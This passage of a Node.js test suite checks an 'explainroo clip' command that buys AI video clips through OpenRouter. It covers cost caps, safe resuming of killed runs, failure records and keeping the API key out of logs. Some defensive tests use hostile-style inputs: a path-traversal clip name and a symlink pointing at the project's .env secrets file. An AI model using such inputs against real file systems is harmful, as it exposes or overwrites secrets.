  const { dir, cli, fake } = await setup(t);
  const r = await cli(clip(dir, STREET));
  assert.equal(r.code, 1);
  assert.match(r.stderr, /--max-cost/);
  assert.match(r.stderr, /Ask the user how much they want to spend/);
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
  assert.deepEqual(jobs(dir), []);
  for (const [cap, pattern] of [['0', /above 0/], ['-1', /above 0/], ['lots', /must be a number/]]) {
    const bad = await cli(clip(dir, STREET, '--max-cost', cap));
    assert.equal(bad.code, 1);
    assert.match(bad.stderr, pattern);
  }
});

test('a price above the cap refuses before any request, and prints the price and the cap', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const r = await cli(clip(dir, STREET, '--max-cost', '0.10'));
  assert.equal(r.code, 1);
  assert.match(r.stderr, /about \$0\.18.*above the cap of \$0\.10/);
  assert.match(r.stderr, /Nothing was spent/);
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
  assert.deepEqual(jobs(dir), []);
  // A cap at the price is allowed.
  assert.equal((await cli(clip(dir, STREET, '--max-cost', '0.18'))).code, 0);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
});

test('Kling with audio refuses at its true price, and the same clip without audio goes through that cap', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const kling = ['--model', 'kwaivgi/kling-v3.0-pro', '--max-cost', '0.80'];
  const withAudio = await cli(clip(dir, STREET, ...kling, '--audio'));
  assert.equal(withAudio.code, 1);
  assert.match(withAudio.stderr, /about \$1\.008, which is above the cap of \$0\.80/);
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
  const silent = await cli([...clip(dir, STREET, ...kling), '--json']);
  assert.equal(silent.code, 0, silent.text);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  const [job] = jobs(dir);
  assert.equal(job.estimated_usd, 0.672);
  assert.equal(job.rate.name, 'text_to_video_duration_seconds_720p');
  assert.equal(job.max_cost_usd, 0.8);
  assert.equal(fake.requests('openrouter', CLIP_POST)[0].body.generate_audio, false);
});

test('an unknown price refuses before any request and suggests another model', async (t) => {
  const { dir, cli, fake } = await setup(t);
  for (const flags of [[], ['--dry-run']]) {
    const r = await cli(clip(dir, STREET, '--model', 'bytedance/seedance-2.0-mini', '--max-cost', '5', ...flags));
    assert.equal(r.code, 1);
    assert.match(r.stderr, /price of bytedance\/seedance-2\.0-mini.*can't be worked out/);
    assert.match(r.stderr, /nothing was spent/);
    assert.match(r.stderr, /google\/veo-3\.1-lite/);
  }
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
  assert.deepEqual(jobs(dir), []);
});

test('a model that left the list, and settings the model does not take, are errors that say what is there', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const fails = async (args, pattern) => {
    const r = await cli(args);
    assert.equal(r.code, 1, args.join(' '));
    assert.match(r.stderr, pattern);
  };
  await fails(clip(dir, STREET, '--model', 'example/gone', '--max-cost', '2'), /example\/gone is not in OpenRouter's list.*google\/veo-3\.1-lite.*kwaivgi\/kling-v3\.0-pro/);
  await fails(['clip', dir, STREET, '--seconds', '5', '--max-cost', '2'], /takes 4, 6 or 8 seconds, not 5/);
  await fails(clip(dir, STREET, '--aspect', '1:1', '--max-cost', '2'), /takes --aspect 16:9 or 9:16, not 1:1/);
  await fails(clip(dir, STREET, '--resolution', '4K', '--max-cost', '2'), /takes --resolution 720p or 1080p, not 4K/);
  await fails(clip(dir, STREET, '--model', 'runway/aleph-2', '--max-cost', '2'), /lists no lengths/);
  await fails(clip(dir, STREET, '--model', 'runway/gen-4.5', '--audio', '--max-cost', '2'), /makes no sound/);
  await fails(clip(dir, STREET, '--model', 'not a model', '--max-cost', '2'), /"cheap", "quality" or an OpenRouter model id/);
  await fails(['clip', dir, STREET, '--max-cost', '2'], /needs --seconds/);
  await fails(clip(dir, 'short', '--max-cost', '2'), /describe the clip/);
  await fails(clip(dir, STREET, '--name', '../up', '--max-cost', '2'), /may only use letters/);
  await fails(['clip', dir], /usage: explainroo clip/);
  // A word too many usually means a mistyped project folder, and it must not become part of the prompt.
  await fails(['clip', 'not-a-project', STREET, '--seconds', '6', '--max-cost', '2'], /no video\.json here|usage: explainroo clip/);
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
  assert.deepEqual(jobs(dir), []);
});

test('the model list being out of reach stops a purchase, and nothing is recorded', async (t) => {
  const { dir, cli, fake } = await setup(t);
  fake.plan('openrouter', CLIP_MODELS_LIST, { status: 503 }, { drop: true });
  for (const pattern of [/HTTP 503/, /could not read the list/]) {
    const r = await cli(bought(dir, STREET));
    assert.equal(r.code, 1);
    assert.match(r.stderr, pattern);
    assert.match(r.stderr, /Nothing was spent/);
  }
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
  assert.deepEqual(jobs(dir), []);
});

test('a normal purchase: the request, a checked MP4 in assets/clips/, its cost in the record, and the line to use', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const r = await cli([...bought(dir, STREET), '--json']);
  assert.equal(r.code, 0, r.text);
  const out = JSON.parse(r.stdout);
  assert.equal(out.status, 'done');
  assert.equal(out.reused, false);
  assert.match(out.name, /^a-busy-street-at-dusk-[0-9a-f]{4}$/);
  assert.equal(out.file, path.join(dir, `assets/clips/${out.name}.mp4`));
  assert.ok(out.clip_line.startsWith(`s.clip('assets/clips/${out.name}.mp4', `));
  assert.equal(out.cost_usd, 0.18);
  assert.equal(out.estimated_usd, 0.18);
  assert.equal(out.total_usd, 0.18);
  assert.equal(out.over_cap, false);

  const [request] = fake.requests('openrouter', CLIP_POST);
  assert.deepEqual(request.body, { model: 'google/veo-3.1-lite', prompt: STREET, duration: 6, aspect_ratio: '16:9', resolution: '720p', generate_audio: false });
  assert.equal(request.headers.authorization, `Bearer ${GOOD_KEY}`);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);

  const info = await probe(out.file);
  assert.ok(info.streams.some((s) => s.codec_type === 'video'));
  assert.ok(Math.abs(Number(info.format.duration) - 6) < 0.5);

  const [job] = jobs(dir);
  assert.equal(job.kind, 'clip');
  assert.equal(job.provider, 'openrouter');
  assert.equal(job.status, 'done');
  assert.equal(job.job_id, 'job_1');
  assert.equal(job.attempt, 1);
  assert.equal(job.cost_usd, 0.18);
  assert.equal(job.estimated_usd, 0.18);
  assert.equal(job.max_cost_usd, 2);
  assert.equal(job.output.name, `assets/clips/${out.name}.mp4`);
  assert.equal(job.output.file, `assets/clips/${out.name}.mp4`);
  assert.deepEqual(job.request, { name: out.name, prompt: STREET, model: 'google/veo-3.1-lite', seconds: 6, aspect: '16:9', resolution: '720p', audio: false });
  assert.doesNotMatch(JSON.stringify(jobs(dir)), new RegExp(GOOD_KEY));
  // Nothing is left on its way in, and that folder stays out of git.
  assert.deepEqual(fs.readdirSync(path.join(dir, 'history/downloads')), []);
  assert.match(read(dir, '.gitignore'), /history\/downloads\//);

  const human = await cli(['history', dir]);
  assert.match(human.stdout, new RegExp(`Clips\\n  \\w+ done assets/clips/${out.name}\\.mp4 \\$0\\.1800`));
  assert.match(human.stdout, /\$0\.1800 in known prices/);
  assert.match(human.stdout, /No open jobs/);
  const report = JSON.parse((await cli(['history', dir, '--json'])).stdout);
  assert.equal(report.spend.usd, 0.18);
  assert.deepEqual(report.open, []);
  assert.equal(report.jobs[0].output.file, `assets/clips/${out.name}.mp4`);

  // It reads as plain text for someone who isn't using --json.
  const fresh = await cli(bought(dir, HARBOR, '--name', 'harbor'));
  assert.equal(fresh.code, 0, fresh.text);
  assert.match(fresh.stdout, /^assets\/clips\/harbor\.mp4 {2}google\/veo-3\.1-lite {2}6s 16:9 720p {2}\$0\.18 {2}\(clips so far: \$0\.36\)/);
  assert.match(fresh.stdout, /s\.clip\('assets\/clips\/harbor\.mp4', /);
  assert.match(fresh.stdout, /Look at a still/);
});

test('--aspect follows the project: wide is 16:9 and anything else is 9:16', async (t) => {
  const { dir, cli, fake } = await setup(t);
  for (const [size, aspect] of [['youtube', '16:9'], ['tiktok', '9:16'], ['square', '9:16'], ['linkedin', '9:16']]) {
    fs.writeFileSync(path.join(dir, 'video.json'), JSON.stringify({ size }));
    const out = JSON.parse((await cli([...clip(dir, STREET, '--dry-run'), '--json'])).stdout);
    assert.equal(out.aspect, aspect, size);
  }
  fs.writeFileSync(path.join(dir, 'video.json'), JSON.stringify({ size: 'tiktok' }));
  assert.equal((await cli(bought(dir, STREET))).code, 0);
  assert.equal(fake.requests('openrouter', CLIP_POST)[0].body.aspect_ratio, '9:16');
});

test('sound stays off unless --audio is given, and a model that can\'t take the setting isn\'t sent it', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const withSound = await cli([...bought(dir, STREET, '--audio'), '--json']);
  assert.equal(withSound.code, 0);
  assert.equal(fake.requests('openrouter', CLIP_POST)[0].body.generate_audio, true);
  // s.clip is silent without a volume, so the line for a clip bought with sound has one.
  assert.match(JSON.parse(withSound.stdout).clip_line, /fit: 'cover', volume: 1, at: 0 \}\);$/);
  assert.equal(jobs(dir)[0].estimated_usd, 0.3);
  // Its setting is unknown, so nothing is sent for it.
  assert.equal((await cli(bought(dir, HARBOR, '--model', 'x-ai/grok-imagine-video'))).code, 0);
  assert.equal('generate_audio' in fake.requests('openrouter', CLIP_POST)[1].body, false);
});

test('the same command again returns the file and buys nothing, also with no key and no cap', async (t) => {
  const { dir, cli, fake } = await setup(t);
  assert.equal((await cli(bought(dir, STREET))).code, 0);
  const again = await cli(clip(dir, STREET), noKey(t));
  assert.equal(again.code, 0, again.text);
  assert.match(again.stdout, /already bought on .*nothing was spent/);
  assert.match(again.stdout, /--new/);
  assert.match(again.stdout, /s\.clip\(/);
  assert.equal(JSON.parse((await cli([...clip(dir, STREET), '--json'])).stdout).reused, true);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  // The cap and how long it waits are not part of what makes it the same clip.
  assert.equal((await cli(clip(dir, STREET, '--max-cost', '9', '--no-wait'))).code, 0);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  // The size is.
  assert.equal((await cli(bought(dir, STREET, '--resolution', '1080p'))).code, 0);
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
});

test('a run killed during polling resumes with one request in total, also from a new session with only the id', async (t) => {
  for (const continueWith of ['same command', 'resume id']) {
    await t.test(continueWith, async (t) => {
      const { dir, start, cli, fake, env } = await setup(t);
      fake.plan('openrouter', CLIP_STATUS, ...Array(2000).fill(running));
      const killed = start(bought(dir, STREET));
      await fake.until('openrouter', CLIP_STATUS, 2);
      killed.child.kill('SIGKILL');
      assert.equal((await killed.result).signal, 'SIGKILL');
      assert.equal(fake.count('openrouter', CLIP_POST), 1);
      // The job id was saved before the first read.
      const [job] = jobs(dir);
      assert.equal(job.status, 'running');
      assert.equal(job.job_id, 'job_1');
      assert.deepEqual(clipFiles(dir), []);

      const [open] = JSON.parse((await cli(['history', dir, '--json'])).stdout).open;
      assert.equal(open.status, 'running');
      assert.match(open.message, /Continuing it buys nothing/);
      assert.doesNotMatch(open.command, /--new|--max-cost/);
      assert.match((await cli(['history', dir])).stdout, /about \$0\.18 at the usual price/);

      fake.plan('openrouter', CLIP_STATUS);
      const r = continueWith === 'same command' ? await cli(bought(dir, STREET)) : await runPrinted(open.command, { ...env });
      assert.equal(r.code, 0, r.text);
      assert.equal(fake.count('openrouter', CLIP_POST), 1);
      assert.equal(jobs(dir)[0].status, 'done');
      assert.equal(jobs(dir)[0].cost_usd, 0.18);
      assert.equal(clipFiles(dir).length, 1);
      assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
    });
  }
});

test('a run killed during the download starts the download again and buys nothing', async (t) => {
  const { dir, start, cli, fake } = await setup(t);
  fake.plan('openrouter', CLIP_FILE, { hold: true });
  const killed = start(bought(dir, STREET));
  await fake.until('openrouter', CLIP_FILE);
  killed.child.kill('SIGKILL');
  await killed.result;
  fake.release();
  assert.equal(jobs(dir)[0].status, 'running');
  assert.equal(jobs(dir)[0].cost_usd, 0.18);
  const r = await cli(bought(dir, STREET));
  assert.equal(r.code, 0, r.text);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.equal(jobs(dir)[0].status, 'done');
});

test('a crash before the job id is saved stops and explains, and --new buys again', async (t) => {
  const { dir, start, cli, fake, env } = await setup(t);
  fake.plan('openrouter', CLIP_POST, { hang: true });
  const killed = start(bought(dir, STREET));
  await fake.until('openrouter', CLIP_POST);
  killed.child.kill('SIGKILL');
  await killed.result;
  assert.equal(jobs(dir)[0].status, 'requesting');
  assert.equal(jobs(dir)[0].job_id, null);

  const again = await cli(bought(dir, STREET));
  assert.equal(again.code, 1);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.match(again.stderr, /may or may not have gone through/);
  assert.match(again.stderr, /may have cost money/);
  assert.match(again.stderr, /--new/);

  // A new session has only the record, and the command it finds has to work as printed.
  const [open] = JSON.parse((await cli(['history', dir, '--json'])).stdout).open;
  assert.equal(open.kind, 'clip');
  assert.equal(open.reason, 'unknown');
  assert.match(open.what, /A busy street/);
  assert.match(open.what, /google\/veo-3\.1-lite/);
  assert.match(open.command, /--resume \w+ --new --max-cost 2$/);
  const printed = await runPrinted(open.command, env);
  assert.equal(printed.code, 0, printed.text);
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
  assert.deepEqual(jobs(dir).map((j) => j.attempt).toSorted(), [1, 2]);
  assert.equal(clipFiles(dir).length, 1);
  assert.deepEqual(JSON.parse((await cli(['history', dir, '--json'])).stdout).open, []);
});

test('a file that fails the check is kept under a clear name, the job says so, and nothing is bought again by itself', async (t) => {
  for (const [what, raw, pattern] of [
    ['a corrupt file', () => Buffer.from('this is not a video at all'), /could not read it as a video/],
    ['the wrong length', () => fakeClip({ duration: 1 }, 1), /it is 1\.0 seconds long, and 6 were asked for/],
  ]) {
    await t.test(what, async (t) => {
      const { dir, cli, fake } = await setup(t);
      fake.plan('openrouter', CLIP_FILE, { raw: raw() });
      const r = await cli(bought(dir, STREET));
      assert.equal(r.code, 1);
      assert.match(r.stderr, pattern);
      assert.match(r.stderr, /failed the check/);
      assert.match(r.stderr, /may have cost money/);
      assert.match(r.stderr, /--new/);
      assert.deepEqual(clipFiles(dir), []);
      const [job] = jobs(dir);
      assert.equal(job.status, 'failed-check');
      assert.equal(job.cost_usd, 0.18);
      assert.match(job.kept, /^history\/failed-check\/a-busy-street.*\.mp4$/);
      assert.ok(fs.statSync(path.join(dir, job.kept)).size > 0);

      const again = await cli(bought(dir, STREET));
      assert.equal(again.code, 1);
      assert.match(again.stderr, /failed the check/);
      assert.equal(fake.count('openrouter', CLIP_POST), 1);
      assert.equal(fake.count('openrouter', CLIP_FILE), 1);
      const [open] = JSON.parse((await cli(['history', dir, '--json'])).stdout).open;
      assert.match(open.command, /--new --max-cost 2$/);

      assert.equal((await cli(bought(dir, STREET, '--new'))).code, 0);
      assert.equal(fake.count('openrouter', CLIP_POST), 2);
      assert.equal(clipFiles(dir).length, 1);
    });
  }
});

test('a failed, cancelled or expired job goes in the record, says it may have cost money, and needs --new', async (t) => {
  for (const [status, said] of [['failed', 'The service says no'], ['cancelled', null], ['expired', null]]) {
    await t.test(status, async (t) => {
      const { dir, cli, fake } = await setup(t);
      fake.plan('openrouter', CLIP_STATUS, running, ended(status, said ? { error: said, usage: { cost: 0.05 } } : {}));
      const r = await cli(bought(dir, STREET));
      assert.equal(r.code, 1);
      assert.match(r.stderr, /may have cost money/);
      assert.match(r.stderr, /--new/);
      if (said) assert.match(r.stderr, new RegExp(said));
      const [job] = jobs(dir);
      assert.equal(job.status, status);
      assert.equal(job.cost_usd, said ? 0.05 : null);

      const again = await cli(bought(dir, STREET));
      assert.equal(again.code, 1);
      assert.match(again.stderr, /may have cost money/);
      assert.equal(fake.count('openrouter', CLIP_POST), 1);

      assert.equal((await cli(bought(dir, STREET, '--new'))).code, 0);
      assert.equal(fake.count('openrouter', CLIP_POST), 2);
      assert.equal(jobs(dir).find((j) => j.attempt === 1).status, status);
    });
  }
});

test('an output that is gone from the service goes in the record and needs --new', async (t) => {
  for (const [what, route] of [['while reading the status', CLIP_STATUS], ['while downloading', CLIP_FILE]]) {
    await t.test(what, async (t) => {
      const { dir, cli, fake } = await setup(t);
      fake.plan('openrouter', route, { status: 404 });
      const r = await cli(bought(dir, STREET));
      assert.equal(r.code, 1);
      assert.match(r.stderr, /no longer had the result/);
      assert.match(r.stderr, /may have cost money/);
      assert.match(r.stderr, /--new/);
      assert.equal(jobs(dir)[0].status, 'gone');
      const again = await cli(bought(dir, STREET));
      assert.equal(again.code, 1);
      assert.equal(fake.count('openrouter', CLIP_POST), 1);
    });
  }
});

test('two identical commands at once buy once', async (t) => {
  const { dir, start, fake } = await setup(t);
  fake.plan('openrouter', CLIP_POST, { hold: true });
  const runs = [start(bought(dir, STREET)).result, start(bought(dir, STREET)).result];
  const loser = await Promise.race(runs);
  assert.equal(loser.code, 1, loser.text);
  assert.match(loser.stderr, /Another run may still be working on it/);
  await fake.until('openrouter', CLIP_POST);
  fake.release();
  const results = await Promise.all(runs);
  assert.deepEqual(results.map((r) => r.code).toSorted(), [0, 1]);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.equal(jobs(dir).length, 1);
  assert.equal(jobs(dir)[0].status, 'done');
});

test('two prompts under one --name: the older file moves aside and comes back when asked for', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const file = path.join(dir, 'assets/clips/shot.mp4');
  assert.equal((await cli(bought(dir, STREET, '--name', 'shot'))).code, 0);
  const first = fs.readFileSync(file);
  const second = await cli(bought(dir, HARBOR, '--name', 'shot'));
  assert.equal(second.code, 0, second.text);
  assert.match(second.stdout, /moved to history\/replaced\/.*brings it back/);
  const harbor = fs.readFileSync(file);
  assert.ok(!first.equals(harbor));
  assert.equal(fake.count('openrouter', CLIP_POST), 2);

  const back = await cli(bought(dir, STREET, '--name', 'shot'));
  assert.equal(back.code, 0, back.text);
  assert.match(back.stdout, /already bought/);
  assert.ok(fs.readFileSync(file).equals(first));
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
  const report = JSON.parse((await cli(['history', dir, '--json'])).stdout);
  const moved = report.jobs.find((j) => j.request.prompt === HARBOR);
  assert.match(moved.output.file, /^history\/replaced\//);
  assert.ok(fs.readFileSync(path.join(dir, moved.output.file)).equals(harbor));
  assert.match((await cli(['history', dir])).stdout, /done history\/replaced\/\w+\.mp4/);

  await cli(bought(dir, HARBOR, '--name', 'shot'));
  assert.ok(fs.readFileSync(file).equals(harbor));
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
});

test('a file no job knows about moves aside too, and a link is only removed', async (t) => {
  const { dir, cli } = await setup(t);
  fs.mkdirSync(path.join(dir, 'assets/clips'));
  fs.writeFileSync(path.join(dir, 'assets/clips/shot.mp4'), 'a clip from somewhere else');
  const r = await cli(bought(dir, STREET, '--name', 'shot'));
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /moved to history\/replaced\//);
  const saved = fs.readdirSync(path.join(dir, 'history/replaced')).map((f) => read(dir, `history/replaced/${f}`));
  assert.ok(saved.includes('a clip from somewhere else'));
  fs.writeFileSync(path.join(dir, '.env'), 'SOME_KEY=a-real-key-1234\n');
  fs.rmSync(path.join(dir, 'assets/clips/shot.mp4'));
  fs.symlinkSync('../../.env', path.join(dir, 'assets/clips/shot.mp4'));
  const linked = await cli(bought(dir, HARBOR, '--name', 'shot'));
  assert.equal(linked.code, 0, linked.text);
  assert.match(linked.stdout, /The link that was at assets\/clips\/shot\.mp4 is gone/);
  assert.equal(read(dir, '.env'), 'SOME_KEY=a-real-key-1234\n');
});

test('--new makes a new attempt, the earlier one keeps its cost, and a repeat returns the newest', async (t) => {
  const { dir, cli, fake } = await setup(t);
  assert.equal((await cli(bought(dir, STREET))).code, 0);
  assert.equal((await cli(bought(dir, STREET, '--new'))).code, 0);
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
  const repeat = JSON.parse((await cli([...bought(dir, STREET), '--json'])).stdout);
  assert.equal(repeat.reused, true);
  assert.equal(repeat.attempt, 2);
  assert.equal(repeat.total_usd, 0.36);
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
  // --new is a purchase, so it needs a cap too.
  const noCap = await cli(clip(dir, STREET, '--new'));
  assert.equal(noCap.code, 1);
  assert.match(noCap.stderr, /--max-cost/);
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
});

test('two runs that fetch the same finished job leave one file, and the record says where it is', async (t) => {
  const { dir, cli, start, fake } = await setup(t);
  fake.plan('openrouter', CLIP_STATUS, ...Array(10).fill(running));
  assert.equal((await cli(bought(dir, STREET), { EXPLAINROO_CLIP_WAIT_MS: '50' })).code, 0);
  fake.plan('openrouter', CLIP_STATUS);
  // The second download ends later, after the first run has put its file in place.
  fake.plan('openrouter', CLIP_FILE, { delay: 300 }, { delay: 900 });
  const results = await Promise.all([start(bought(dir, STREET)).result, start(bought(dir, STREET)).result]);
  assert.deepEqual(results.map((r) => r.code), [0, 0], results.map((r) => r.text).join('\n'));
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  const [job] = jobs(dir);
  assert.equal(job.output.file, 'assets/clips/a-busy-street-at-dusk-435f.mp4');
  assert.equal(clipFiles(dir).length, 1);
  assert.match((await cli(['history', dir])).stdout, /done assets\/clips\/a-busy-street-at-dusk-435f\.mp4 \$0\.1800/);
});

test('the wait is limited: the command exits cleanly and says running it again will not buy again', async (t) => {
  const { dir, cli, fake, env } = await setup(t);
  fake.plan('openrouter', CLIP_STATUS, ...Array(2000).fill(running));
  const r = await cli(bought(dir, STREET), { EXPLAINROO_CLIP_WAIT_MS: '150' });
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /still running/);
  assert.match(r.stdout, /Running the same command again will not buy again/);
  const json = JSON.parse((await cli([...bought(dir, STREET), '--json'], { EXPLAINROO_CLIP_WAIT_MS: '50' })).stdout);
  assert.equal(json.status, 'running');
  assert.match(json.command, /--resume \w+$/);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.equal(jobs(dir)[0].status, 'running');
  assert.deepEqual(clipFiles(dir), []);

  fake.plan('openrouter', CLIP_STATUS);
  const printed = await runPrinted(json.command, env);
  assert.equal(printed.code, 0, printed.text);
  assert.equal(jobs(dir)[0].status, 'done');
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
});

test('--no-wait returns right after the request, and the same command picks it up', async (t) => {
  const { dir, cli, fake } = await setup(t);
  const r = await cli([...bought(dir, STREET, '--no-wait'), '--json']);
  assert.equal(r.code, 0, r.text);
  const out = JSON.parse(r.stdout);
  assert.equal(out.status, 'running');
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.equal(fake.count('openrouter', CLIP_STATUS), 0);
  assert.equal(jobs(dir)[0].job_id, 'job_1');
  assert.match(r.stderr, /will not buy again/);
  // The same command repeated looks once and doesn't wait, so it still gets the file.
  fake.plan('openrouter', CLIP_STATUS, running);
  const again = await cli(bought(dir, STREET, '--no-wait'));
  assert.equal(again.code, 0, again.text);
  assert.match(again.stdout, /It is still running\. Running the same command again will not buy again/);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.equal(fake.count('openrouter', CLIP_STATUS), 1);
  assert.equal(jobs(dir)[0].status, 'running');
  const done = await cli(bought(dir, STREET, '--no-wait'));
  assert.equal(done.code, 0, done.text);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.equal(fake.count('openrouter', CLIP_STATUS), 2);
  assert.equal(jobs(dir)[0].status, 'done');
});

test('history lists every clip job with where its file is and what it cost, and a job with no file says so', async (t) => {
  const { dir, cli, fake } = await setup(t);
  assert.equal((await cli(bought(dir, STREET, '--name', 'street'))).code, 0);
  fake.plan('openrouter', CLIP_STATUS, ended('failed', { error: 'no' }));
  assert.equal((await cli(bought(dir, HARBOR, '--name', 'harbor'))).code, 1);
  fake.plan('openrouter', CLIP_POST, { status: 402 });
  assert.equal((await cli(clip(dir, 'Waves on a rocky shore', '--name', 'waves', '--max-cost', '2'))).code, 1);
  fake.plan('openrouter', CLIP_FILE, { raw: Buffer.from('not a video') });
  assert.equal((await cli(clip(dir, 'Snow on a quiet road', '--name', 'snow', '--max-cost', '2'))).code, 1);
  const { stdout } = await cli(['history', dir]);
  const section = stdout.slice(stdout.indexOf('Clips\n'), stdout.indexOf('Nothing rendered yet'));
  assert.match(section, /\w+ done assets\/clips\/street\.mp4 \$0\.1800/);
  assert.match(section, /\w+ failed harbor, no file about \$0\.18/);
  assert.match(section, /\w+ refused waves, no file cost nothing/);
  assert.match(section, /\w+ failed-check history\/failed-check\/snow\.\w+\.mp4 \$0\.1800/);
  assert.equal(section.trim().split('\n').length, 5);
});

test('reads may retry and a request never does', async (t) => {
  const { dir, cli, fake } = await setup(t);
  fake.plan('openrouter', CLIP_STATUS, { status: 500 }, { drop: true }, { status: 429 }, running);
  fake.plan('openrouter', CLIP_FILE, { status: 503 }, { dropBody: true });
  const r = await cli(bought(dir, STREET));
  assert.equal(r.code, 0, r.text);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
  assert.equal(fake.count('openrouter', CLIP_STATUS), 5);
  assert.equal(fake.count('openrouter', CLIP_FILE), 3);
  assert.equal(jobs(dir)[0].status, 'done');
});

test('a download that keeps failing leaves the job as it is, and the next run gets the file', async (t) => {
  const { dir, cli, fake } = await setup(t);
  fake.plan('openrouter', CLIP_FILE, { status: 500 }, { status: 500 }, { status: 500 });
  const r = await cli(bought(dir, STREET));
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /the download did not work/);
  assert.match(r.stdout, /will not buy again/);
  assert.equal(jobs(dir)[0].status, 'running');
  assert.equal((await cli(bought(dir, STREET))).code, 0);
  assert.equal(jobs(dir)[0].status, 'done');
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
});

test('a status that can\'t be read until the wait is over says so, and a rejected key leaves the job as it is', async (t) => {
  const { dir, cli, fake } = await setup(t);
  fake.plan('openrouter', CLIP_STATUS, ...Array(2000).fill({ status: 503 }));
  const r = await cli(bought(dir, STREET), { EXPLAINROO_CLIP_WAIT_MS: '100' });
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /Its status could not be read: OpenRouter answered with HTTP 503/);
  fake.plan('openrouter', CLIP_STATUS);
  const rejected = await cli(bought(dir, STREET), { OPENROUTER_API_KEY: 'bad-key-value' });
  assert.equal(rejected.code, 1);
  assert.match(rejected.stderr, /rejected the API key/);
  assert.doesNotMatch(rejected.text, /bad-key-value/);
  assert.equal(jobs(dir)[0].status, 'running');
  assert.equal((await cli(bought(dir, STREET))).code, 0);
  assert.equal(fake.count('openrouter', CLIP_POST), 1);
});

test('the real cost goes in the record, and the command says when it came out above the cap', async (t) => {
  const { dir, cli, fake } = await setup(t);
  fake.plan('openrouter', CLIP_STATUS, ended('completed', { usage: { cost: 3.5 } }));
  const r = await cli(bought(dir, STREET));
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /It cost \$3\.50, which is above the cap of \$2\.00/);
  assert.equal(jobs(dir)[0].cost_usd, 3.5);
  assert.equal(jobs(dir)[0].estimated_usd, 0.18);
  assert.equal(JSON.parse((await cli(['history', dir, '--json'])).stdout).spend.usd, 3.5);
  assert.equal(JSON.parse((await cli([...bought(dir, STREET), '--json'])).stdout).over_cap, true);
});

test('with no price in the answer the record says so, and the estimate stays', async (t) => {
  const { dir, cli, fake } = await setup(t);
  fake.plan('openrouter', CLIP_STATUS, ended('completed'));
  const r = await cli(bought(dir, STREET));
  assert.equal(r.code, 0, r.text);
  assert.match(r.stdout, /cost unknown, about \$0\.18/);
  assert.equal(jobs(dir)[0].cost_usd, null);
  assert.equal(JSON.parse((await cli(['history', dir, '--json'])).stdout).spend.unknown_price, 1);
  assert.match((await cli(['history', dir])).stdout, /done assets\/clips\/\S+ about \$0\.18/);
});

test('a refusal costs nothing and needs no --new, but it still needs a cap', async (t) => {
  const { dir, cli, fake, env } = await setup(t);
  fake.plan('openrouter', CLIP_POST, { status: 402, body: { error: { message: 'Insufficient credits' } } });
  const r = await cli(bought(dir, STREET));
  assert.equal(r.code, 1);
  assert.match(r.stderr, /no credit left/);
  assert.doesNotMatch(r.stderr, /--new/);
  assert.equal(jobs(dir)[0].status, 'refused');
  const [open] = JSON.parse((await cli(['history', dir, '--json'])).stdout).open;
  assert.doesNotMatch(open.command, /--new/);
  assert.match(open.command, /--max-cost 2$/);
  const printed = await runPrinted(open.command, env);
  assert.equal(printed.code, 0, printed.text);
  assert.equal(fake.count('openrouter', CLIP_POST), 2);
});

test('a request with an error or no answer is never sent again by itself, not even after a clear 5xx', async (t) => {
  for (const [what, step, status] of [['a 5xx', { status: 500 }, 'failed'], ['a dropped connection', { drop: true }, 'lost'], ['no job id', { status: 202, body: { status: 'pending' } }, 'failed']]) {
    await t.test(what, async (t) => {
      const { dir, cli, fake } = await setup(t);
      fake.plan('openrouter', CLIP_POST, step);
      const r = await cli(bought(dir, STREET));
      assert.equal(r.code, 1);
      assert.match(r.stderr, /may have cost money/);
      assert.match(r.stderr, /--new/);
      assert.equal(fake.count('openrouter', CLIP_POST), 1);
      assert.equal(jobs(dir)[0].status, status);
      assert.equal((await cli(bought(dir, STREET))).code, 1);
      assert.equal(fake.count('openrouter', CLIP_POST), 1);
      assert.equal(JSON.parse((await cli(['history', dir, '--json'])).stdout).spend.may_have_cost_usd, 0.18);
    });
  }
});

test('without a key nothing is sent or recorded, and the error points at connect', async (t) => {
  const { dir, cli, fake } = await setup(t);
  if (fs.existsSync(path.join(path.dirname(bin), '..', '.env'))) return;
  const r = await cli(bought(dir, STREET), noKey(t));
  assert.equal(r.code, 1);
  assert.match(r.stderr, /explainroo connect openrouter/);
  assert.equal(fake.count('openrouter', CLIP_POST), 0);
